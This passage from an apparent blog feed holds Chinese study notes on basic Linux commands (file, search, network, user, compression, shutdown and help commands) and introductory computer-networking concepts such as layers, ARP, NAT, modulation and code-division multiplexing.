        <content type="html"><![CDATA[<p>CTRL +C 终止命令 CTRL +L 清屏  </p><h1 id="1-命令格式和目录处理命令"><a href="#1-命令格式和目录处理命令" class="headerlink" title="1.命令格式和目录处理命令"></a>1.命令格式和目录处理命令</h1><p>命令 [-选项] [参数]<br>eg: ls -la /etc<br>当有多个选项时，可以写在一起<br>简化选项与完整选项 -a等于–all  </p><h2 id="命令名称-ls"><a href="#命令名称-ls" class="headerlink" title="命令名称:ls"></a>命令名称:ls</h2><p>命令英文原意: list<br>命令所在路径:/bin/ls<br>执行权限:所有用户<br>功能描述:显示目录文件<br>语法:ls选项[-ald][文件或目录]<br>-a显示所有文件，包括隐藏文件 all<br>-l详细信息显示 long<br>-lh 人性化显示 可以将字节转化为合适大小的单位<br>-i id号<br>-d查看目录属性<br><strong>eg:</strong><br>drwxr-xr-x 2(引用系数) root（所有者：只能有一个） root（所属组：多个） 4096（单位字节） 1月   9 02:18（修改时间如果没有被修改就为创建时间） 桌面（文件名）<br>既不是所有者又不是所属组就是其他人<br>文件类型<br>-表示为一个文件<br>d开头表示一个文件目录<br>l开头为一个软链接<br>rwx           r-x        r-x<br>u所有者g所属组 o其他人<br>r读w写x执行  </p><h2 id="命令名称-mkdir"><a href="#命令名称-mkdir" class="headerlink" title="命令名称: mkdir"></a>命令名称: mkdir</h2><p>命令英文原意: make directories<br>命令所在路径:/bin/mkdir<br>执行权限:所有用户<br>语法: mkdir -p [目录名]<br>功能描述:创建新目录<br>-p 递归创建  </p><h2 id="命令名称-cd"><a href="#命令名称-cd" class="headerlink" title="命令名称: cd"></a>命令名称: cd</h2><p>命令英文原意:change directory命令所在路径: shell内置命令执行权限:所有用户<br>语法: cd[目录]<br>功能描述:切换目录<br>. 表示当前目录 ..表示上一级目录  </p><h2 id="命令名称-pwd"><a href="#命令名称-pwd" class="headerlink" title="命令名称: pwd"></a>命令名称: pwd</h2><p>命令英文原意:print working directory<br>命令所在路径:/bin/pwd<br>执行权限:所有用户语法:pwd<br>功能描述:显示当前目录  </p><h2 id="命令名称-rmdir"><a href="#命令名称-rmdir" class="headerlink" title="命令名称: rmdir"></a>命令名称: rmdir</h2><p>命令英文原意:remove empty directories<br>命令所在路径:/bin/rmdir<br>执行权限:所有用户<br>语法: rmdir[目录名]<br>功能描述 <strong>:删除空目录</strong>  </p><h2 id="命令名称-cp"><a href="#命令名称-cp" class="headerlink" title="命令名称:cp"></a>命令名称:cp</h2><p>命令英文原意:copy<br>命令所在路径:/bin/ep<br>执行权限:所有用户<br>语法:cp -rp[原文件或目录][目标目录]<br>-r 复制目录<br>-p 保留文件属性<br>功能描述:复制文件或目录  </p><h2 id="命令名称-mv"><a href="#命令名称-mv" class="headerlink" title="命令名称: mv"></a>命令名称: mv</h2><p>命令英文原意:move<br>命令所在路径:/bin/mv<br>执行权限:所有用户<br>语法: mv[原文件或目录][目标目录]<br>功能描述:剪切文件、改名  </p><h2 id="命令名称-rm"><a href="#命令名称-rm" class="headerlink" title="命令名称:rm"></a>命令名称:rm</h2><p>命令英文原意:remove命令所在路径:/bin/rm执行权限:所有用户<br>语法: rm -rf[文件或目录]<br>-r删除目录<br>-f强制执行<br>功能描述:删除文件或目录  </p><h1 id="1-2文件处理命令"><a href="#1-2文件处理命令" class="headerlink" title="1.2文件处理命令"></a>1.2文件处理命令</h1><h2 id="命令名称-touch"><a href="#命令名称-touch" class="headerlink" title="命令名称: touch"></a>命令名称: touch</h2><p>命令所在路径:/bin/touch<br>执行权限:所有用户<br>语法: touch[文件名]<br>功能描述:创建空文件<br>如果想创建带空格的文件应将文件名写入“ ”中  </p><h2 id="命令名称-cat"><a href="#命令名称-cat" class="headerlink" title="命令名称: cat"></a>命令名称: cat</h2><p>命令所在路径:/bin/cat<br>执行权限:所有用户<br>语法: cat[文件名]<br>功能描述:显示文件内容<br>-n显示行号  </p><h2 id="命令名称-tac"><a href="#命令名称-tac" class="headerlink" title="命令名称: tac"></a>命令名称: tac</h2><p>命令所在路径:/usr/bin/tac<br>执行权限:所有用户<br>语法: tac[文件名]<br>功能描述:显示文件内容（反向列示)<br><strong>注意反向显示不支持-n</strong>  </p><h2 id="命令名称-more"><a href="#命令名称-more" class="headerlink" title="命令名称: more"></a>命令名称: more</h2><p>命令所在路径:/bin/more<br>执行权限:所有用户<br>语法: more[文件名]<br>(空格)或f   翻页<br>(Enter)  换行<br>b  返回<br>q或Q 退出<br>功能描述:分页显示文件内容  </p><h2 id="命令名称-less"><a href="#命令名称-less" class="headerlink" title="命令名称: less"></a>命令名称: less</h2><p>命令所在路径:/usr/bin/less<br>执行权限:所有用户<br>语法: less [文件名]<br>功能描述:分页显示文件内容（可向上翻页)<br>可以搜索关键词 n可以切换下一个  </p><h2 id="命令名称-head"><a href="#命令名称-head" class="headerlink" title="命令名称: head"></a>命令名称: head</h2><p>命令所在路径:/usr/bin/head执行权限:所有用户<br>语法: head[文件名]<br>功能描述:显示文件前面几行<br>-n指定行数 无指定默认前10行  </p><h2 id="命令名称-tail"><a href="#命令名称-tail" class="headerlink" title="命令名称: tail"></a>命令名称: tail</h2><p>命令所在路径:/usr/bin/tail<br>执行权限:所有用户<br>语法: tail[文件名]<br>功能描述:显示文件后面几行<br>-n指定行数<br>-f动态显示文件末尾内容  </p><h2 id="命令名称-ln"><a href="#命令名称-ln" class="headerlink" title="命令名称: ln"></a>命令名称: ln</h2><p>命令英文原意:link<br>命令所在路径:/bin/ln<br>执行权限:所有用户<br>语法: ln -s[原文件][目标文件]<br>-s创建软链接<br>功能描述:生成链接文件<br>软连接类似Windows的快捷方式<br><strong>软连接</strong> lrwxrwxrwx<br>新生成的文件 -&gt;源文件<br>箭头指向源文件<br><strong>硬链接</strong><br>1.属性一致 可与源文件同步更新 并且源文件删除无影响<br>2.通过i节点识别（硬链接id与源文件一致）<br>3.不能跨分区<br>4.不能针对目录使用  </p><h1 id="文件搜索-find"><a href="#文件搜索-find" class="headerlink" title="文件搜索 find"></a>文件搜索 find</h1><p>命令名称: find<br>命令所在路径:/bin/find<br>执行权限:所有用户<br>语法: find[搜索范围][匹配条件]<br>功能描述:文件搜索  </p><p>eg：<br>$find /etc -name init<br>在/etc下查找文件init<br>$find /etc -name *init*<br>?单字符匹配<br>文件中包含init<br>-iname 不区分大小写  </p><p>$find / -size +204800<br>1数据块 512字节 0.5K<br>在根目录下查找大于100MB文件<br>+n 大于 -n 小于 n 等于   </p><p>$find /home -user username<br>-group 是根据在所属组里查找  </p><p>find /etc -cmin -5 (超过5分钟加五)<br>在/etc 下查找5分钟内被修改过的属性文件和目录<br>-amin 访问时间access<br>-cmin 文件属性change ls找到的<br>-mmin 文件内容modify  </p><p>-a表示两个条件都满足<br>-o表示两个条件一个满足即可  </p><p>-type 根据文件类型查找<br>f 文件 d 目录 l 软连接 </p><p>$find /etc -name init -exec ls -l {} ;<br>在/etc下查找init文件并显示其详细信息-exec/-ok 命令 {} ; </p><p>eg：find /etc -name init* -a -type f -exec ls -lh {} ;<br>查找etc目录下的init名字开头的文件并显示详细信息  </p><p>-inum 根据i结点查找<br>ls -i<br>查看i结点<br>eg：find -inum id -exec rm {} ;</p><h1 id="其他文件搜索"><a href="#其他文件搜索" class="headerlink" title="其他文件搜索"></a>其他文件搜索</h1><h2 id="locate"><a href="#locate" class="headerlink" title="locate"></a>locate</h2><p>命令所在路径:/usr/bin/<br>locate执行权限:所有用户<br>语法: locate文件名<br>功能描述:在文件资料库中查找文件<br>-i 不区分大小写</p><h3 id="update"><a href="#update" class="headerlink" title="update"></a>update</h3><p>updatedb 更新资料库<br>tmp目录下的文件找不到，因为不在范围内</p><h2 id="which"><a href="#which" class="headerlink" title="which"></a>which</h2><p>命令所在路径:/usr/bin/which<br>执行权限:所有用户<br>语法: which命令<br>功能描述:搜索命令所在目录及别名信息<br>which ls  </p><h2 id="whereis"><a href="#whereis" class="headerlink" title="whereis"></a>whereis</h2><p>命令所在路径:/usr/bin/whereis<br>执行权限:所有用户<br>语法: whereis[命令名称]<br>功能描述:搜索命令所在目录及帮助文档路径  </p><h2 id="grep"><a href="#grep" class="headerlink" title="grep"></a>grep</h2><p>命令所在路径:/bin/grep<br>执行权限:所有用户<br>语法: grep -iv[指定字串][文件]<br>功能描述:在文件中搜寻字串匹配的行并输出<br>-i不区分大小写<br>-v排除指定字串  </p><h1 id="网络命令"><a href="#网络命令" class="headerlink" title="网络命令"></a>网络命令</h1><h2 id="write"><a href="#write" class="headerlink" title="write"></a>write</h2><p>指令所在路径: /usr/bin/write<br>执行权限:所有用户<br>语法: write&lt;用户名&gt;<br>功能描述:给用户发信息，以Ctrl+D保存结束  </p><h2 id="wall"><a href="#wall" class="headerlink" title="wall"></a>wall</h2><p>命令英文原意:write all<br>指令所在路径:/usr/bin/wall<br>执行权限:所有用户<br>语法: wall [message]<br>功能描述:发广播信息  </p><h2 id="ping"><a href="#ping" class="headerlink" title="ping"></a>ping</h2><p>命令所在路径:/bin/ping<br>执行权限:所有用户<br>语法: ping选项IP地址<br>-c指定发送次数<br>功能描述:测试网络连通性   </p><h2 id="ifconfig"><a href="#ifconfig" class="headerlink" title="ifconfig"></a>ifconfig</h2><p>命令英文原意: interface configure<br>命令所在路径:/sbin/ifconfig<br>执行权限: root<br>语法: ifconfig网卡名称IP地址<br>功能描述:查看和设置网卡信息  </p><h2 id="mail"><a href="#mail" class="headerlink" title="mail"></a>mail</h2><p>命令所在路径:/bin/mail<br>执行权限:所有用户语法: mail [用户名]<br>功能描述:查看发送电子邮件  </p><h2 id="last"><a href="#last" class="headerlink" title="last"></a>last</h2><p>命令所在路径:/usr/bin/last<br>执行权限:所有用户<br>语法: last<br>功能描述:列出目前与过去登入系统的用户信息  </p><h2 id="lastlog"><a href="#lastlog" class="headerlink" title="lastlog"></a>lastlog</h2><p>命令所在路径:/usr/bin/lastlog<br>执行权限:所有用户<br>语法: lastlog<br>功能描述:检查某特定用户上次登录的时间<br>-u 加id只查看该用户   </p><h2 id="traceroute"><a href="#traceroute" class="headerlink" title="traceroute"></a>traceroute</h2><p>命令所在路径:/bin/traceroute<br>执行权限:所有用户<br>语法: traceroute<br>功能描述:显示数据包到主机间的路径<br>traceroute <a href="http://www.baidu.com/">www.baidu.com</a>  </p><h2 id="netstat"><a href="#netstat" class="headerlink" title="netstat"></a>netstat</h2><p>命令所在路径:/bin/netstat<br>执行权限:所有用户<br>语法: netstat[选项]<br>功能描述:显示网络相关信息<br>-t tcp协议<br>-u UDP协议<br>-l 监听<br>-r 路由<br>-n 显示ip地址和端口号<br>服务发起端口是随机的，只有接收端口是固定的<br>netstat -tlun<br>查看本机监听的端口<br>netstat -an<br>查看本机所有的网络连接<br>#netstat -rn<br>查看本机路由表  </p><h2 id="setup-redhat"><a href="#setup-redhat" class="headerlink" title="setup (redhat)"></a>setup (redhat)</h2><p>命令所在路径:/usr/bin/setup<br>执行权限:root<br>语法: setup<br>功能描述:配置网络  </p><h2 id="mount"><a href="#mount" class="headerlink" title="mount"></a>mount</h2><p>命令位置:/bin/mount<br>执行权限:所有用户<br>命令语法: mount [-t文件系统]设备文件名挂载点<br>范例:# mount -t iso9660 /dev/sr0 /mnt/cdrom  </p><h1 id="用户管理命令"><a href="#用户管理命令" class="headerlink" title="用户管理命令"></a>用户管理命令</h1><h2 id="useradd"><a href="#useradd" class="headerlink" title="useradd"></a>useradd</h2><p>命令所在路径:/usr/sbin/useradd<br>执行权限:root<br>语法: useradd username<br>功能描述:添加新用户<br>eg:$ useradd phantomor  </p><h3 id="useradd-命令无法使用"><a href="#useradd-命令无法使用" class="headerlink" title="useradd 命令无法使用"></a>useradd 命令无法使用</h3><p>useradd:无法锁定 /etc/passwd，请稍后再试  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ls -l /etc/passwd <span class="comment">##查看权限；权限为读写</span></span><br><span class="line">lsattr /etc/passwd <span class="comment">##若出现i---e ,执行（1）；否则（2）</span></span><br><span class="line">chattr -i /etc/passwd <span class="comment">##(1)</span></span><br><span class="line">useradd zhangsan <span class="comment">##(1)</span></span><br><span class="line">sudo useradd zhangsan<span class="comment">##(2)；当然也可以直接执行这一步</span></span><br></pre></td></tr></table></figure><h2 id="passwd"><a href="#passwd" class="headerlink" title="passwd"></a>passwd</h2><p>命令所在路径:/usr/bin/passwd<br>执行权限:所有用户<br>语法: passwd 用户名<br>功能描述:设置用户密码  </p><h2 id="命令名称-who"><a href="#命令名称-who" class="headerlink" title="命令名称: who"></a>命令名称: who</h2><p>命令所在路径:/usr/bin/who<br>执行权限:所有用户<br>语法: who<br>功能描述:查看登录用户信息  </p><h2 id="命令名称-w"><a href="#命令名称-w" class="headerlink" title="命令名称:w"></a>命令名称:w</h2><p>命令所在路径:/usr/bin/w<br>执行权限:所有用户<br>语法: w<br>功能描述:查看登录用户详细信息  </p><h1 id="压缩解压命令"><a href="#压缩解压命令" class="headerlink" title="压缩解压命令"></a>压缩解压命令</h1><h2 id="gzip"><a href="#gzip" class="headerlink" title="gzip"></a>gzip</h2><p>命令英文原意:GNUzip<br>命令所在路径:/bin/gzip<br>执行权限:所有用户<br>语法: gzip[文件]<br>功能描述:压缩文件压缩后<br>文件格式:.gZ  </p><h2 id="gunzip"><a href="#gunzip" class="headerlink" title="gunzip"></a>gunzip</h2><p>命令英文原意:GNUunzip<br>命令所在路径:/bin/gunzip<br>执行权限:所有用户<br>语法: gunzip[压缩文件]<br>功能描述:解压缩.gz的压缩文件  </p><h2 id="tar"><a href="#tar" class="headerlink" title="tar"></a>tar</h2><p>命令所在路径:/bin/tar<br>执行权限:所有用户<br>语法: tar选项[-zcf][压缩后文件名][目录]<br>-c 打包<br>-v 显示详细信息<br>-f 指定文件名<br>-z 打包同时压缩<br>功能描述:打包目录<br>eg: tar <strong>-zcf</strong> ec.tar.gz ec<br>打包ec 并压缩成ec文件<br>tar -zxf etc.tar.gz //解压</p><h2 id="zip"><a href="#zip" class="headerlink" title="zip"></a>zip</h2><p>命令所在路径:/usr/bin/zip<br>执行权限:所有用户<br>语法:zip 选项[-r][压缩后文件名][文件或目录]<br>-r 压缩目录<br>功能描述:压缩文件或目录<br>压缩后文件格式:.zip<br>能保留源文件</p><h2 id="unzip"><a href="#unzip" class="headerlink" title="unzip"></a>unzip</h2><p>解压缩</p><h2 id="bzip2"><a href="#bzip2" class="headerlink" title="bzip2"></a>bzip2</h2><p>命令所在路径:/usr/bin/bzip2<br>执行权限:所有用户<br>语法: bzip2选项[-k][文件]<br><strong>-k产生压缩文件后保留原文件</strong><br>功能描述:压缩文件<br>压缩后文件格式:.bz2<br>bzip2 -k et<br>tar -cjf et.tar.bz2 et  //压缩<br>tar -xjf et.tar.bz2 //解压缩</p><h2 id="bunzip2"><a href="#bunzip2" class="headerlink" title="bunzip2"></a>bunzip2</h2><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><table><thead><tr><th>格式</th><th>.gz</th><th>.tar</th><th>.tar.gz</th><th>.zip</th><th>.bz2</th><th>.tar.bz2</th></tr></thead><tbody><tr><td>压缩</td><td>gzip</td><td>tar -cf</td><td>tar -zcf</td><td>zip -r</td><td>bzip2</td><td>tar -cjf</td></tr><tr><td>解压</td><td>gunzip(gzip -d)</td><td>-xf</td><td>-zxf</td><td>unzip</td><td>bunzip2</td><td>-xjf</td></tr></tbody></table><h1 id="关机和重启"><a href="#关机和重启" class="headerlink" title="关机和重启"></a>关机和重启</h1><h2 id="1-shutdown"><a href="#1-shutdown" class="headerlink" title="1.shutdown"></a>1.shutdown</h2><p>[root@localhost ~]# shutdown[选项]<br>时间选项:<br>-c:取消前一个关机命令<br>-h:关机<br>-r:重启  </p><h2 id="其他关机命令"><a href="#其他关机命令" class="headerlink" title="其他关机命令"></a>其他关机命令</h2><p>halt<br>poweroff<br>init 0  </p><h2 id="其他重启命令"><a href="#其他重启命令" class="headerlink" title="其他重启命令"></a>其他重启命令</h2><p>reboot<br>init 6  </p><h1 id="系统运行级别"><a href="#系统运行级别" class="headerlink" title="系统运行级别"></a>系统运行级别</h1><p>0 关机<br>1 单用户(windows开机时 F8)<br>2  不完全用户，不含NFS(Network File Server)服务<br>3 完全多用户<br>4 未分配<br>5 图形界面<br>6 重启<br>cat /etc/inittab<br>修改系统的默认运行级别<br>id:3:initdefault:<br>runlevel<br>查看系统运行级别  </p><h2 id="logout"><a href="#logout" class="headerlink" title="logout"></a>logout</h2><p>退出登录    </p><h1 id="帮助命令"><a href="#帮助命令" class="headerlink" title="帮助命令"></a>帮助命令</h1><h2 id="man"><a href="#man" class="headerlink" title="man"></a>man</h2><p>命令英文原意: manual<br>命令所在路径:/usr/bin/man<br>执行权限:所有用户<br>语法: man[命令或配置文件]<br>功能描述:获得帮助信息范例:$ man ls<br>查看ls命令的帮助信息$ man services<br>查看配置文件services的帮助信息<br>当查看配置文件时不需要文件的绝对路径，只需添加文件的名称<br>1表示对命令的帮助 5表示对配置文件的帮助<br>man 5 passwd  </p><h2 id="whatis-amp-apropos"><a href="#whatis-amp-apropos" class="headerlink" title="whatis &amp; apropos"></a>whatis &amp; apropos</h2><p>whatis和apropos都可以查命令和配置文件。 </p><h2 id="–help"><a href="#–help" class="headerlink" title="–help"></a>–help</h2><p>eg: ls –help</p><h2 id="info"><a href="#info" class="headerlink" title="info"></a>info</h2><h2 id="help"><a href="#help" class="headerlink" title="help"></a>help</h2><p>命令所在路径:Shell<br>内置命令执行权限:所有用户<br>语法: help命令<br>功能描述:获得Shell内置命令的帮助信息<br>eg:$ help umask<br>查看umask命令的帮助信息  </p>]]></content>
      
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计网学习-应用层</title>
      <link href="/2021/03/23/Network/%E5%BA%94%E7%94%A8%E5%B1%82/"/>
      <url>/2021/03/23/Network/%E5%BA%94%E7%94%A8%E5%B1%82/</url>
      
        <content type="html"><![CDATA[<p>在Web应用程序中，有两个互相通信的不同的程序：一个是运行在用户主机上的浏览器程序；另一个是运行在Web服务器主机上的Web服务器程序</p>]]></content>
      
      
      <categories>
          
          <category> Network </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Network </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计网学习-物理层</title>
      <link href="/2021/03/23/Network/%E7%89%A9%E7%90%86%E5%B1%82/"/>
      <url>/2021/03/23/Network/%E7%89%A9%E7%90%86%E5%B1%82/</url>
      
        <content type="html"><![CDATA[<h1 id="计网定义"><a href="#计网定义" class="headerlink" title="计网定义"></a>计网定义</h1><p>连通性和共享  </p><h2 id="计网分类"><a href="#计网分类" class="headerlink" title="计网分类"></a>计网分类</h2><p>1.分组交换 ；2.电路交换（拨号上网）就是连着电话线，还有猫（调制解调器）一上网就打不了电话。（当然是有好处的，传输的时候不用等待）<br>所以找到了分组交换<br>分组交换又分为<br>1.虚电路，如ATM（模拟电话线路）；2.数据报，如因特网<br>因为互联网没有实时要求，面向连接浪费资源所以不用1<br>虽然分组和电路都用但是分组交换更有效<br><strong>那么如何传输数据报</strong><br>-———————————-<br>1.因特网肯定是基于物理电路的，<br>因此，我们需要一个，将数据转化为物理信号的层，<br>于是，<strong>物理层</strong>就出现了<br>-———————————-<br>2.有了处理物理信号的物理层，可我们还需要知道，信号发给谁<br>众所周知，每个主机都有一个，全球唯一的MAC地址<br>所以，我们可以用MAC地址来寻址<br>于是，<strong>链路层</strong>就出现了<br>-———————————-<br>3.MAC地址是扁平化的，换句话说MAC地址的空间分布，是无规律的！！！<br>如果有十万台主机，要通过MAC地址来寻址，不管你设计什么样的算法，数据量都太大了！！！<br>所以，我们需要IP地址，<br>于是，<strong>网络层</strong>就出现了<br>-———————————-<br>4.一台主机不能只和一台服务器通信啊，<br>我们有端口号，再基于不同需求：有人想要连得快，不介意数据丢失，有人必须要数据可靠，<br>于是产生了UDP和TCP<br>于是，<strong>运输层</strong>就出现了<br>-———————————-<br>5.不同应用，有不同的传输需求<br>比如，请求网页，发送邮件，P2P…<br>为了方便开发者，就对这些常用需求，进行了封装<br>于是，<strong>应用层</strong>就出现了<br>-———————————-<br>因为ip地址不够用，于是有了子网划分，手动分配太麻烦，于是有了DHCP，不好用，于是有了无分类编址（CIDR）<br>然后NAT出现了，于是专用网的IP不再占用公网IP</p><h4 id="有了ip地址为什么还要Mac地址？"><a href="#有了ip地址为什么还要Mac地址？" class="headerlink" title="有了ip地址为什么还要Mac地址？"></a>有了ip地址为什么还要Mac地址？</h4><p>1.IP地址本质上是终点地址，它在跳过路由器（hop）的时候不会改变，而MAC地址则是下一跳的地址，每跳过一次路由器都会改变。<br>这就是为什么还要用MAC地址的原因之一，它起到了记录下一跳的信息的作用<br>注：一般来说IP地址经过路由器是不变的，不过NAT（Network address translation）例外，这也是有些人反对NAT而支持IPV6的原因之一<br>2.MAC地址和IP地址两个地址，用于分别表示物理地址和逻辑地址是有好处的。这样分层可以使网络层与链路层的协议更灵活地替换，网络层不一定非要用『IP』协议，链路层也不一定非用『以太网』协议。<br>3.早期的以太网只有集线器（hub），没有交换机（switch），所以发出去的包能被以太网内的所有机器监听到，因此要附带上MAC地址，每个机器只需要接受与自己MAC地址相匹配的包。</p><h3 id="1-计网范围"><a href="#1-计网范围" class="headerlink" title="1.计网范围"></a>1.计网范围</h3><p>广域网WAN<br>城域网MAN<br>局域网LAN  </p><p>保密性质的广域网，通信要VPN</p><p>局域网内的通信：链路交换机！！！链路交换机是基于MAC寻址的，因为局域网没大到必须用IP寻址的地步<br>链路交换机采用了，跨越链路层和网络层边界的协议ARP.</p><p><strong>ARP协议</strong> ：根据IP地址获取物理地址的一个TCP/IP协议。主机发送信息时将包含目标IP地址的ARP请求广播到局域网络上的所有主机，并接收返回消息，以此确定目标的物理地址；收到返回消息后将该IP地址和物理地址存入本机ARP缓存中并保留一定时间，下次请求时直接查询ARP缓存以节约资源。地址解析协议是建立在网络中各个主机互相信任的基础上的，局域网络上的主机可以自主发送ARP应答消息，其他主机收到应答报文时不会检测该报文的真实性就会将其记入本机ARP缓存；由此攻击者就可以向某一主机发送伪ARP应答报文，使其发送的信息无法到达预期的主机或到达错误的主机，这就构成了一个<strong>ARP欺骗</strong>。这就可以搞事情</p><p>ARP要做一个IP到MAC的映射，<br>（1.为什么ARP要做IP到MAC的映射？因为在应用层和运输层里，目的地址都写得是IP,不把IP转化为MAC，第二层数据链路层怎么寻址）<br>（2.局域网为什么不用路由器，交换机功能少，接口多，比路由器划算）<br>（3.局域网和公网怎么通信呢?NAT。分组交换机（路由器），用自己的公网IP，帮局域网里的人们，给公网发信息然后把接受到的信息，再转发给，这就是NAT技术！<br>但可能说NAT不好，我们要拒绝NAT,使用IPv6那么就牵扯到了IPv4和IPv6间的通信（双栈||隧道）</p><h3 id="2-使用者分类"><a href="#2-使用者分类" class="headerlink" title="2.使用者分类"></a>2.使用者分类</h3><p>公用网和专用网</p><h3 id="3-接入网"><a href="#3-接入网" class="headerlink" title="3.接入网"></a>3.接入网</h3><p>AN<br>我们可以用线，把电脑接给猫，这就叫接入网</p><h2 id="计网性能"><a href="#计网性能" class="headerlink" title="计网性能"></a>计网性能</h2><p>1.速率 bit/s 实际值<br>2.带宽 bandwidth 频带宽度 最高速度<br>3.吞吐量 单位时间内通过的网络 吞吐量受带宽的限制<br>4.时延 delay<br>发送时延 传播时延 处理时延 排队时延<br>5.时延带宽积<br>6.往返时间 RTT<br>7.利用率  D=D0/1-U  </p><h2 id="计算机网络体系结构"><a href="#计算机网络体系结构" class="headerlink" title="计算机网络体系结构"></a>计算机网络体系结构</h2><p>协议<br>为网络中数据的交换而建立的规则</p><p><strong>各层级功能</strong>  </p><ol><li>差错控制    </li><li>流量控制    </li><li>分段和重装  </li><li>复用和分用</li><li>连接的建立与释放    </li></ol><p>五层协议体系结构</p><ul><li>应用层 application layer</li><li>运输层 transport layer</li><li>网络层 network layer</li><li>数据链路层 data link layer</li><li>物理层 physical layer</li></ul><p>协议是水平的 服务是垂直的</p><h1 id="物理层"><a href="#物理层" class="headerlink" title="物理层"></a>物理层</h1><h1 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h1><p>机械特性：接口所用的形状和尺寸<br>电气特性：接口电缆各个显示出现的电压范围<br>功能特性：电压代表的含义<br>过程特性：出现事件的顺序   </p><h1 id="数据通信"><a href="#数据通信" class="headerlink" title="数据通信"></a>数据通信</h1><p>通信系统的三大部分：源系统(发送端)、传输系统(传输网络)，目的系统(接收端，接收方)。<br><img src="https://img-blog.csdnimg.cn/20210326193801855.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUxOTExNDMy,size_16,color_FFFFFF,t_7" alt="在这里插入图片描述"></p><p>数据（data）——运送信息的实体<br>信号（signal）——数据的电气的或电磁的表现<br>模拟信号(analogous signal)——代表消息的参数是连续的<br>数字信号(digital signal)——代表消息的参数的取值是类散的<br>信道<br>码元（code）-使用时间域的波形表示数字信号，代表不同的波形。<br>单向通信：只能有一个方向的同学而不能有反方向的交互。<br>双向交替通信：都可以通信但同时只能单向发送数据<br>双向同时通信 ：可以同时发送数据   </p><p>基带信号是(基本频带信号)最原始的1和0<br>基带信号中往往包含低频或直流部分，许多信道不能传输这种，因此必须对基带信号进行调制（modulation）</p><p>调制分为<strong>基带调制</strong>和<strong>带通调制</strong><br>基带调制:仅对基带信号的波形进行变换,使它能够与信道特性相适应。变换后的信号仍然是基带信号。把这种过程称为编码(coding)。<br>带通调制:使用载波(carrier)进行调制，把基带信号的频率范围搬移到较高的频段，并转换为模拟信号，这样就能够更好地在模拟信道中传输（即仅在一段频率范围内能够通过信道)。<br>带通信号:经过载波调制后的信号。 </p><h2 id="基带调制"><a href="#基带调制" class="headerlink" title="基带调制"></a>基带调制</h2><p>编码方式<br>比特流：<br>不归零制<br>归零制<br>曼切斯特<br>差分曼切斯特<br><img src="https://img-blog.csdnimg.cn/20210326194347650.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUxOTExNDMy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="带通调制"><a href="#带通调制" class="headerlink" title="带通调制"></a>带通调制</h2><p>调幅AM 调频FM 调相PM<br><img src="https://img-blog.csdnimg.cn/20210326194955856.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUxOTExNDMy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="信道的极限容量"><a href="#信道的极限容量" class="headerlink" title="信道的极限容量"></a>信道的极限容量</h2><p>失真数据<br>信道能通过的频率范围<br>信噪比<br>码元传输速率是有极限的，和频带有关<br>信噪比：信号的平均功率和噪音的平均功率之比<br>信噪比（dB）=10ln（S/N）(dB)<br>香农公式：信道的极限运输速率为C，C=Wlog<del>2</del>(1+S/N)<br>W表示信道带宽<br>S信号平均功率<br>N高斯噪声功率<br>C基本因为材料的受限基本无法提高，，但可以通过用编码的方式让码元携带更多的bit</p><h1 id="传输媒体"><a href="#传输媒体" class="headerlink" title="传输媒体"></a>传输媒体</h1><h2 id="导引型传输信号"><a href="#导引型传输信号" class="headerlink" title="导引型传输信号"></a>导引型传输信号</h2><p>双绞线 CAT（屏蔽双绞线，非屏蔽双绞线）<br>同轴电缆（不太使用了）基带同轴电缆：数字信号；宽带同轴电缆：模拟信号<br>光纤<br>多模光纤：可反射多个光<br>单模光纤 ：不太损耗能量（波分复用实现双向传递）</p><h2 id="非导引型传输媒体"><a href="#非导引型传输媒体" class="headerlink" title="非导引型传输媒体"></a>非导引型传输媒体</h2><p>无线传输所使用的频段很广。<br>短波通信（即高频通信）主要是靠电离层的反射，但短波信道的通信质量较差，传输速率低。<br>微波在空间主要是直线传播。<br>传统微波通信有两种方式：<br>地面微波通信<br>卫星通信</p><h1 id="信号复用"><a href="#信号复用" class="headerlink" title="信号复用"></a>信号复用</h1><h2 id="频分复用，波分复用，时分复用，"><a href="#频分复用，波分复用，时分复用，" class="headerlink" title="频分复用，波分复用，时分复用，"></a>频分复用，波分复用，时分复用，</h2><p>频分复用的所有用户在同样的时间占用不同的带宽资源（请注意,这里的“带宽”是频率带宽而不是数据的发送速率)<br>波分复用就是光的频分复用，使用一根光纤同时传输多个光在波信号<br>时分复用在不同时间上使用一样的频带，分给不同的用户，但可能会造成线路资源浪费。</p><h2 id="码分复用-CDM"><a href="#码分复用-CDM" class="headerlink" title="码分复用 CDM"></a>码分复用 CDM</h2><p>每一个用户挑选不同码型，被叫做码片序列<br>每一个比特时间划分为m个短的间隔，称为码(chip)。<br>每个站被指派一个唯一的m bit码片序列。如发送比特1，则发送自己的m bit码片序列。如发送比特0，则发送该码片序列的二进制反码。<br>用于计算时零变成-1,1变成+1<br><strong>CDMA（码分多址）的特点</strong><br>每个站分配的码片序列不仅必须各不相同，并且还必须互相正交(orthogonal)。<br>在实用的系统中是使用伪随机码序列。<br>令向量S表示站S的码片向量，令T表示其他任何站的码片向量。<br>两个不同站的码片序列正交，就是向量S和T的规格化内积(inner product)等于0:<br><img src="https://img-blog.csdnimg.cn/20210326205435594.png" alt="在这里插入图片描述"><br>所以自己与自己求内积求出的是1<br>码片向量与反码的向量的规格化内积为-1<br>下面题目<br><img 